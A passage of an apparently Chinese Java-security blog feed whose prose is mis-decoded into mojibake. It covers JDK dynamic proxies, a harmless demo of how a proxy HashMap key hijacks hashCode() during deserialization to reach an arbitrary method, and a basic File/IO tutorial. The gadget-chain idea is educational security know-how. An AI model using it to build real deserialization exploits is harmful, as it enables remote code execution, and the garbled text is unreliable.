æ¥å£â€çš„ä»£ç†ç±»å®ä¾‹</span></span><br><span class="line">        <span class="type">PayService</span> <span class="variable">proxy</span> <span class="operator">=</span> (PayService) Proxy.newProxyInstance(</span><br><span class="line">                target.getClass().getClassLoader(),   <span class="comment">// ç±»åŠ è½½å™¨</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;PayService.class&#125;,        <span class="comment">// ä»£ç†è¦â€œé•¿å¾—åƒâ€å“ªäº›æ¥å£</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">TimingLogHandler</span>(target)          <span class="comment">// æ‹¦æˆªå™¨ï¼šæ–¹æ³•ç»Ÿä¸€è¿› invoke</span></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è°ƒç”¨ä»£ç†å¯¹è±¡çš„æ–¹æ³•ï¼Œæœ€ç»ˆä¼šè¿› invoke(...)</span></span><br><span class="line">        proxy.pay(<span class="number">200</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-åˆ›å»ºä»£ç†ç±»å‚æ•°è¯¦è§£"><a href="#3-åˆ›å»ºä»£ç†ç±»å‚æ•°è¯¦è§£" class="headerlink" title="3.åˆ›å»ºä»£ç†ç±»å‚æ•°è¯¦è§£"></a>3.åˆ›å»ºä»£ç†ç±»å‚æ•°è¯¦è§£</h3><p>åˆ›å»ºä»£ç†å¯¹è±¡çš„æ ¸å¿ƒæ–¹æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">proxy</span> <span class="operator">=</span> Proxy.newProxyInstance(</span><br><span class="line">    ç±»åŠ è½½å™¨,</span><br><span class="line">    æ¥å£æ•°ç»„,</span><br><span class="line">    è°ƒç”¨å¤„ç†å™¨</span><br><span class="line">);</span><br></pre></td></tr></table></figure><hr><p>å‚æ•°ä¸€ï¼šClassLoaderï¼ˆç±»åŠ è½½å™¨ï¼‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target.getClass().getClassLoader()</span><br></pre></td></tr></table></figure><ul><li>ç”¨æ¥<strong>åŠ è½½ç”Ÿæˆçš„ä»£ç†ç±»</strong></li><li>å†³å®šä»£ç†ç±»â€œç”±è°åŠ è½½åˆ° JVM ä¸­â€</li></ul><hr><p>å‚æ•°äºŒï¼šinterfacesï¼ˆä»£ç†è¦å®ç°çš„æ¥å£ï¼‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target.getClass().getInterfaces()</span><br></pre></td></tr></table></figure><ul><li>æŒ‡å®šä»£ç†ç±»<strong>è¦å®ç°å“ªäº›æ¥å£</strong></li><li>JDK åŠ¨æ€ä»£ç† <strong>åªèƒ½ä»£ç†æ¥å£</strong></li></ul><hr><p>å‚æ•°ä¸‰ï¼šInvocationHandlerï¼ˆè°ƒç”¨å¤„ç†å™¨ &#x2F; æ‹¦æˆªå™¨ï¼‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">TimingLogHandler</span>(target)</span><br></pre></td></tr></table></figure><ul><li><strong>ä»£ç†çš„æ ¸å¿ƒ</strong></li><li>æ‰€æœ‰æ¥å£æ–¹æ³•è°ƒç”¨ï¼Œæœ€ç»ˆéƒ½ä¼šèµ°åˆ°è¿™é‡Œ</li></ul><p>å†…éƒ¨æ‰§è¡Œå…¥å£</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span></span><br></pre></td></tr></table></figure><h2 id="ä¸‰ã€åœ¨ååºåˆ—åŒ–ä¸­çš„åˆ©ç”¨"><a href="#ä¸‰ã€åœ¨ååºåˆ—åŒ–ä¸­çš„åˆ©ç”¨" class="headerlink" title="ä¸‰ã€åœ¨ååºåˆ—åŒ–ä¸­çš„åˆ©ç”¨"></a>ä¸‰ã€åœ¨ååºåˆ—åŒ–ä¸­çš„åˆ©ç”¨</h2><p>ç®€å•æ¼”ç¤º</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProxyDeserializeDemo</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** ç›¸å½“äºBï¼šæœ‰ä¸€ä¸ªâ€œæ•æ„ŸåŠ¨ä½œâ€ fï¼ˆè¿™é‡Œç”¨æ‰“å°ä»£æ›¿ï¼‰ */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">B</span> <span class="keyword">implements</span> <span class="title class_">java</span>.io.Serializable &#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">f</span><span class="params">(String from)</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;&gt;&gt;&gt; B.f() è¢«è°ƒç”¨ï¼è§¦å‘æ¥æº = &quot;</span> + from);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** ç›¸å½“äºä½ æ–‡é‡Œçš„ InvocationHandlerï¼šO çš„æ–¹æ³•è°ƒç”¨æœ€ç»ˆéƒ½ä¼šè¿› invoke */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">H</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span>, Serializable &#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> B target;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">H</span><span class="params">(B target)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.target = target;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> method.getName();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// å…³é”®ï¼šååºåˆ—åŒ– HashMap æ—¶ï¼Œä¼šè§¦å‘ key.hashCode()ï¼Œä»è€Œè¿›å…¥è¿™é‡Œ</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="string">&quot;hashCode&quot;</span>.equals(name)) &#123;</span><br><span class="line">                target.f(<span class="string">&quot;hashCode() during HashMap.readObject&quot;</span>);</span><br><span class="line">                <span class="comment">// hashCode å¿…é¡»è¿”å› int</span></span><br><span class="line">                <span class="keyword">return</span> <span class="number">123</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// å…¶ä»–æ–¹æ³•é»˜è®¤å¤„ç†</span></span><br><span class="line">            <span class="keyword">return</span> method.invoke(<span class="built_in">this</span>, args);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 1) å‡†å¤‡ä»£ç†å¯¹è±¡ Oï¼ˆproxyï¼‰</span></span><br><span class="line">        <span class="type">B</span> <span class="variable">b</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">B</span>();</span><br><span class="line">        <span class="type">O</span> <span class="variable">proxy</span> <span class="operator">=</span> (O) Proxy.newProxyInstance(</span><br><span class="line">                O.class.getClassLoader(),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;O.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">H</span>(b)</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2) æŠŠ proxy æ”¾è¿› HashMap ä½œä¸º keyï¼ˆè¿™å°±æ˜¯â€œå…¥å£å¯¹è±¡å›¾â€çš„ä¸€éƒ¨åˆ†ï¼‰</span></span><br><span class="line">        Map&lt;Object, String&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(proxy, <span class="string">&quot;value&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3) åºåˆ—åŒ–</span></span><br><span class="line">        <span class="type">byte</span>[] data;</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">             <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bos)) &#123;</span><br><span class="line">            oos.writeObject(map);</span><br><span class="line">            data = bos.toByteArray();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;=== å¼€å§‹ååºåˆ—åŒ– ===&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4) ååºåˆ—åŒ–ï¼šä½ ä¼šçœ‹åˆ°è¿™é‡Œâ€œæ²¡è°ƒç”¨ abc()â€ï¼Œä½†ä¼šæ‰“å° B.f è¢«è§¦å‘</span></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(data))) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;=== ååºåˆ—åŒ–ç»“æŸ ===&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">A[O] -&gt; O.abc        //æ­£å¸¸æ–¹æ³•</span><br><span class="line">O[O2] invoke -&gt; O2.f // æ­¤æ—¶å°† B å»æ›¿æ¢ O2</span><br><span class="line">æœ€å  ----&gt;</span><br><span class="line">O[B] invoke -&gt; B.f // è¾¾åˆ°æ¼æ´åˆ©ç”¨æ•ˆæœ</span><br></pre></td></tr></table></figure><p>ç¤ºä¾‹ä¸­ï¼Œä½¿ç”¨<strong>porxyçš„hashcodeæ–¹æ³•</strong>ä»£æ›¿æ‰ abc æ— å®³æ–¹æ³•ï¼Œå¯ä»¥è°ƒè¯•å°è¯•é£Ÿç”¨ï¼ï¼ï¼</p><p>ä»£ç†çš„ä»·å€¼åœ¨ååºåˆ—åŒ–é“¾é‡Œä¸æ˜¯â€œå®ƒä¼šè¢«ååºåˆ—åŒ–è‡ªåŠ¨æ‰§è¡Œâ€ï¼Œè€Œæ˜¯ï¼š</p><blockquote><p><strong>å®ƒèƒ½æŠŠä¸€æ¬¡â€œçœ‹ä¼¼æ— å®³çš„æ–¹æ³•è°ƒç”¨â€ï¼ˆhashCode&#x2F;toString&#x2F;compare&#x2F;abcï¼‰åŠ«æŒæˆä½  <code>invoke()</code> é‡Œæƒ³åšçš„ä»»ä½•äº‹ã€‚</strong></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> javaå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javaå®‰å…¨ </tag>
            
            <tag> ååºåˆ—åŒ– </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javaå®‰å…¨-ioæµ</title>
      <link href="/2025/12/16/io/"/>
      <url>/2025/12/16/io/</url>
      
        <content type="html"><![CDATA[<h1 id="javaå®‰å…¨-IOæµ"><a href="#javaå®‰å…¨-IOæµ" class="headerlink" title="javaå®‰å…¨-IOæµ"></a>javaå®‰å…¨-IOæµ</h1><ul><li><p><strong>ioæµç”¨æ¥åœ¨ Java ç¨‹åºå’Œâ€œå¤–éƒ¨ä¸–ç•Œâ€ä¹‹é—´ä¼ è¾“æ•°æ®</strong></p></li><li><p><strong>javaé¡¹ç›®ä¸­çš„ç›¸å¯¹è·¯å¾„</strong></p><blockquote><p><strong>Java ä¸­çš„ç›¸å¯¹è·¯å¾„ï¼Œé»˜è®¤æ˜¯ç›¸å¯¹äºã€Œç¨‹åºçš„å·¥ä½œç›®å½•ï¼ˆWorking Directoryï¼‰ã€</strong><br>åœ¨ IDEA é‡Œï¼Œ<strong>é»˜è®¤å°±æ˜¯ã€Œé¡¹ç›®æ ¹ç›®å½•ã€</strong>ã€‚</p></blockquote></li></ul><h2 id="ä¸€ã€æ–‡ä»¶ç›¸å…³æ“ä½œ"><a href="#ä¸€ã€æ–‡ä»¶ç›¸å…³æ“ä½œ" class="headerlink" title="ä¸€ã€æ–‡ä»¶ç›¸å…³æ“ä½œ"></a>ä¸€ã€æ–‡ä»¶ç›¸å…³æ“ä½œ</h2><h3 id="1-åˆ›å»ºfileå¯¹è±¡"><a href="#1-åˆ›å»ºfileå¯¹è±¡" class="headerlink" title="1.åˆ›å»ºfileå¯¹è±¡"></a>1.åˆ›å»ºfileå¯¹è±¡</h3><p>æœ¬è´¨ä¸Šæ˜¯ä¸‰ç§æ„é€ æ–¹å¼</p><ul><li><p><strong>æ ¹æ®å®Œæ•´è·¯å¾„å­—ç¬¦ä¸²åˆ›å»º</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ç›´æ¥ä¼ é€’å®Œæ•´è·¯å¾„</span></span><br><span class="line"><span class="type">File</span> <span class="variable">f1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;D:\\test\\java.txt&quot;</span>); </span><br><span class="line"><span class="comment">// æˆ–è€…ä½¿ç”¨ç›¸å¯¹è·¯å¾„ï¼ˆç›¸å¯¹äºé¡¹ç›®æ ¹ç›®å½•ï¼‰</span></span><br><span class="line"><span class="type">File</span> <span class="variable">f2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;src/main/resources/config.xml&quot;</span>);</span><br><span class="line"></span><br><span class="line">System.out.println(f1.getAbsolutePath());</span><br></pre></td></tr></table></figure></li><li><p><strong>æ ¹æ®â€œçˆ¶è·¯å¾„å­—ç¬¦ä¸²â€å’Œâ€œå­è·¯å¾„å­—ç¬¦ä¸²â€åˆ›å»º</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">parentPath</span> <span class="operator">=</span> <span class="string">&quot;D:\\test&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> <span class="string">&quot;java.txt&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// çˆ¶è·¯å¾„å­—ç¬¦ä¸² + å­è·¯å¾„å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="comment">// ç³»ç»Ÿä¼šè‡ªåŠ¨è¡¥å…¨ä¸­é—´çš„åˆ†éš”ç¬¦ï¼ˆWindowsæ˜¯\, Linuxæ˜¯/ï¼‰</span></span><br><span class="line"><span class="type">File</span> <span class="variable">f3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(parentPath, fileName); </span><br><span class="line"></span><br><span class="line">System.out.println(f3.getPath()); <span class="comment">// è¾“å‡º D:\test\java.txt</span></span><br></pre></td></tr></table></figure></li><li><p><strong>æ ¹æ®â€œçˆ¶ File å¯¹è±¡â€å’Œâ€œå­è·¯å¾„å­—ç¬¦ä¸²â€åˆ›å»º</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å…ˆåˆ›å»ºçˆ¶çº§ç›®å½•å¯¹è±¡</span></span><br><span class="line"><span class="type">File</span> <span class="variable">parentDir</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;D:\\test&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> <span class="string">&quot;java.txt&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// çˆ¶Fileå¯¹è±¡ + å­è·¯å¾„å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="type">File</span> <span class="variable">f4</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(parentDir, fileName);</span><br><span class="line"></span><br><span class="line">System.out.println(f4.getPath());</span><br></pre></td></tr></table></figure></li></ul><p><code>boolean created = file.createNewFile();</code>é€šè¿‡è°ƒç”¨fileå¯¹è±¡çš„è¿™ä¸ªæ–¹æ³•å¯ä»¥åˆ›å»ºæ–‡ä»¶</p><h3 id="2-è·å–fileå¯¹è±¡ä¿¡æ¯"><a href="#2-è·å–fileå¯¹è±¡ä¿¡æ¯" class="headerlink" title="2.è·å–fileå¯¹è±¡ä¿¡æ¯"></a>2.è·å–fileå¯¹è±¡ä¿¡æ¯</h3><ul><li><p><strong>è·å–è·¯å¾„ä¸åç§°</strong></p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202512312317772.png" alt="image-20251215221009667" style="zoom:80%;" /></li><li><p><strong>è·å–æ–‡ä»¶çŠ¶æ€</strong></p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202512312317452.png" alt="image-20251215221035460" style="zoom:80%;" /></li><li><p><strong>è·å–æ–‡ä»¶å±æ€§</strong></p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202512312314088.png" alt="image-20251215221114792" style="zoom:70%;" /></li></ul><h3 id="3-ç›®å½•ä¸æ–‡ä»¶æ“ä½œ"><a href="#3-ç›®å½•ä¸æ–‡ä»¶æ“ä½œ" class="headerlink" title="3.ç›®å½•ä¸æ–‡ä»¶æ“ä½œ"></a>3.ç›®å½•ä¸æ–‡ä»¶æ“ä½œ</h3><table><thead><tr><th>æ“ä½œ</th><th>æ–¹æ³•å</th><th>è¿”å›å€¼</th><th>å…³é”®æ³¨æ„ç‚¹</th></tr></thead><tbody><tr><td><strong>æ–‡ä»¶&#x2F;ç›®å½•åˆ é™¤</strong></td><td><strong>delete()</strong></td><td>boolean</td><td><strong>ä¸èµ°å›æ”¶ç«™</strong>ï¼Œç›´æ¥æŠ¹é™¤ï¼›<strong>åˆ é™¤ç›®å½•æ—¶ï¼Œç›®å½•å¿…é¡»ä¸ºç©º</strong>ã€‚</td></tr><tr><td><strong>åˆ›å»ºå•çº§ç›®å½•</strong></td><td><strong>mkdir()</strong></td><td>boolean</td><td>åªæœ‰çˆ¶ç›®å½•å­˜åœ¨æ—¶æ‰èƒ½åˆ›å»ºæˆåŠŸã€‚</td></tr><tr><td><strong>åˆ›å»ºå¤šçº§ç›®å½•</strong></td><td><strong>mkdirs()</strong></td><td>boolean</td><td><strong>æœ€æ¨è</strong>ã€‚å¦‚æœçˆ¶ç›®å½•ä¸å­˜åœ¨ï¼Œä¼šè‡ªåŠ¨è¡¥å…¨æ‰€æœ‰çˆ¶ç›®å½•ã€‚</td></tr></tbody></table><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åœºæ™¯ Aï¼šåˆ›å»ºå•çº§ç›®å½• (mkdir)</span></span><br><span class="line"><span class="comment">// å‡è®¾ D:\test å­˜åœ¨ï¼Œåˆ›å»º D:\test\demo æ‰ä¼šæˆåŠŸ</span></span><br><span class="line"><span class="type">File</span> <span class="variable">dir1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;D:\\test\\demo&quot;</span>);</span><br><span class="line"><span class="type">boolean</span> <span class="variable">mk1</span> <span class="operator">=</span> dir1.mkdir(); </span><br><span class="line">System.out.println(<span class="string">&quot;å•çº§ç›®å½•åˆ›å»ºç»“æœï¼š&quot;</span> + mk1);</span><br><span class="line"></span><br><span class="line"><span class="comment">// åœºæ™¯ Bï¼šåˆ›å»ºå¤šçº§ç›®å½• (mkdirs) - ã€æ¨èã€‘</span></span><br><span class="line"><span class="comment">// å³ä½¿ D:\newTest ä¸å­˜åœ¨ï¼Œä¹Ÿä¼šè‡ªåŠ¨åˆ›å»º D:\newTest\a\b</span></span><br><span class="line"><span class="type">File</span> <span class="variable">dir2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;D:\\newTest\\a\\b&quot;</span>);</span><br><span class="line"><span class="type">boolean</span> <span class="variable">mk2</span> <span class="operator">=</span> dir2.mkdirs();</span><br><span class="line">System.out.println(<span class="string">&quot;å¤šçº§ç›®å½•åˆ›å»ºç»“æœï¼š&quot;</span> + mk2);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// --- 1. æ–‡ä»¶åˆ é™¤ ---</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// delete() æ–¹æ³•ç«‹å³ç”Ÿæ•ˆï¼Œä¸èµ°å›æ”¶ç«™</span></span><br><span class="line"><span class="type">boolean</span> <span class="variable">delFile</span> <span class="operator">=</span> file.delete();</span><br><span class="line">System.out.println(<span class="string">&quot;åˆ é™¤æ–‡ä»¶(data.txt)ç»“æœï¼š&quot;</span> + delFile);</span><br><span class="line"></span><br><span class="line"><span class="comment">// --- 2. ç›®å½•åˆ é™¤ ---    </span></span><br><span class="line"><span class="comment">// ã€æ³¨æ„ã€‘å°è¯•åˆ é™¤ D:\newTest\a ç›®å½•</span></span><br><span class="line"><span class="comment">// ç°åœ¨çš„ç»“æ„æ˜¯ D:\newTest\a\b (bæ˜¯ç©ºç›®å½•)</span></span><br><span class="line"><span class="type">File</span> <span class="variable">parentDir</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;D:\\newTest\\a&quot;</span>);</span><br><span class="line"><span class="comment">// æ­¤æ—¶ a ä¸‹é¢è¿˜æœ‰ bï¼Œæ‰€ä»¥ a ä¸æ˜¯ç©ºç›®å½•ï¼Œåˆ é™¤ä¼šå¤±è´¥ï¼</span></span><br><span class="line"><span class="type">boolean</span> <span class="variable">delDirFail</span> <span class="operator">=</span> parentDir.delete(); </span><br><span class="line">System.out.println(<span class="string">&quot;åˆ é™¤éç©ºç›®å½•(a)ç»“æœï¼š&quot;</span> + delDirFail); <span class="comment">// è¾“å‡º false</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// æ­£ç¡®åšæ³•ï¼šå¿…é¡»å…ˆåˆ é™¤ bï¼Œå†åˆ é™¤ a</span></span><br><span class="line"><span class="type">boolean</span> <span class="variable">delSubDir</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;D:\\newTest\\a\\b&quot;</span>).delete();</span><br><span class="line">System.out.println(<span class="string">&quot;åˆ é™¤å­ç›®å½•(b)ç»“æœï¼š&quot;</span> + delSubDir); <span class="comment">// true (å› ä¸ºbæ˜¯ç©ºçš„)</span></span><br><span class="line"></span><br><span class="line"><span class="type">boolean</span> <span class="variable">delParentDir</span> <span class="operator">=</span> parentDir.delete();</span><br><span class="line">System.out.println(<span class="string">&quot;å†æ¬¡åˆ é™¤ç›®å½•(a)ç»“æœï¼š&quot;</span> + delParentDir); <span class="comment">// true (ç°åœ¨aç©ºäº†)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="äºŒã€IOæµæ“ä½œ"><a href="#äºŒã€IOæµæ“ä½œ" class="headerlink" title="äºŒã€IOæµæ“ä½œ"></a>äºŒã€IOæµæ“ä½œ</h2><p>åœ¨ Java ä¸­ï¼Œæ•°æ®ä¼ è¾“åƒæ°´æµä¸€æ ·ã€‚</p><ul><li><strong>è¾“å…¥ï¼ˆInputï¼‰</strong>ï¼šæ•°æ®ä»â€œå¤–éƒ¨â€ï¼ˆç¡¬ç›˜ã€ç½‘ç»œã€é”®ç›˜ï¼‰æµå‘â€œç¨‹åºå†…å­˜â€ã€‚ï¼ˆè¯»ï¼‰</li><li><strong>è¾“å‡ºï¼ˆOutputï¼‰</strong>ï¼šæ•°æ®ä»â€œç¨‹åºå†…å­˜â€æµå‘â€œå¤–éƒ¨â€ã€‚ï¼ˆå†™ï¼‰</li><li><strong>ç‰¹ç‚¹</strong>ï¼šæµæ˜¯æœ‰æ–¹å‘çš„ï¼Œè€Œä¸”é€šå¸¸æ˜¯é¡ºåºçš„ï¼ˆå…ˆè¯»çš„å…ˆåˆ°ï¼‰ã€‚</li></ul><p><strong>æ¶æ„å¦‚ä¸‹ï¼š</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202512312315670.png" alt="image-20251216121711728"></p><h3 id="1-å­—èŠ‚è¾“å…¥æµ-InputStream"><a href="#1-å­—èŠ‚è¾“å…¥æµ-InputStream" class="headerlink" title="1.å­—èŠ‚è¾“å…¥æµ(InputStream)"></a>1.å­—èŠ‚è¾“å…¥æµ(InputStream)</h3><p><strong>å®šä¹‰</strong>ï¼šå®ƒæ˜¯æ‰€æœ‰å­—èŠ‚è¾“å…¥æµçš„<strong>è¶…ç±»ï¼ˆçˆ¶ç±»ï¼‰</strong>ï¼Œæ˜¯ä¸€ä¸ªæŠ½è±¡ç±»ã€‚å®ƒä»¥**å­—èŠ‚ï¼ˆByteï¼Œ8ä½ï¼‰**ä¸ºå•ä½è¯»å–æ•°æ®ã€‚</p><p><strong>å¸¸ç”¨å­ç±»</strong>ï¼šFileInputStream</p><p><strong>æ ¸å¿ƒæ–¹æ³•</strong>ï¼š</p><ul><li><code>int read()</code>: ä¸€æ¬¡è¯»ä¸€ä¸ªå­—èŠ‚ã€‚å¦‚æœè¯»åˆ°æ–‡ä»¶æœ«å°¾ï¼Œè¿”å› -1ã€‚</li><li><code>int read(byte[] b)</code>: ä¸€æ¬¡è¯»ä¸€ä¸ªå­—èŠ‚æ•°ç»„ï¼ˆæ•ˆç‡é«˜ï¼‰ã€‚è¿”å›è¯»å–åˆ°çš„æœ‰æ•ˆå­—èŠ‚ä¸ªæ•°ã€‚</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 